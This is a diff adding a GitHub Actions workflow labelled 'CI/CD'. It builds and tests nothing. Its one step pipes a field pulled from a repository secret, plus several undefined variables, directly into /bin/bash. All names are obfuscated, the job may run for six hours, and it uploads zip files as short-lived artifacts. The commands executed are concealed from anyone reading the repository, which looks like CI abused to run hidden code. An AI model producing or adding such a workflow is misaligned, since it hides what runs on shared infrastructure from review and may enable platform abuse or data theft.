@@ -1,0 +1,30 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          pu275: ${{ secrets.pu275 }}
+        run: |
+          printf '%s' "$pu275" | jq -r .oifh770 | /bin/bash
+          echo $qdjjr1 | jq -r .spsz840 | /bin/bash
+          printf '%s' "$of13" | jq -r .bidct58507 | /bin/bash
+          echo $csze60 | jq -r .h96 | /bin/bash
+          printf '%s' "$r41" | jq -r .hngi24991 | /bin/bash
+          printf '%s' "$delh15032" | jq -r .vyyw38903 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6Phbwiva
+          path: "*.zip"
+          retention-days: 1
